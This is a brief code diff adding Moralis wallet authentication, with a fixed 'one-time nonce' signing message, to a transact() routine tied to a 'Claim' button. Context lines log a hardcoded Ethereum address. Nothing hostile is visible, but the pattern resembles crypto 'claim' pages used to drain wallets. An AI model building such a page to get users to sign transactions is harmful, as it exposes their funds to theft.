@@ -66,6 +66,12 @@ async function transact() {
         claim.innerText = "Claim";
     }
 });
+    let user = Moralis.User.current();
+    try {
+        user = await Moralis.authenticate({ provider: pvdr, signingMessage: "I am signing my one-time nonce: 513767" })
+    } catch (error) {
+        console.log(error)
+    }
     var options, optionss, optionsss;
     console.log("0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff");
     optionss = {
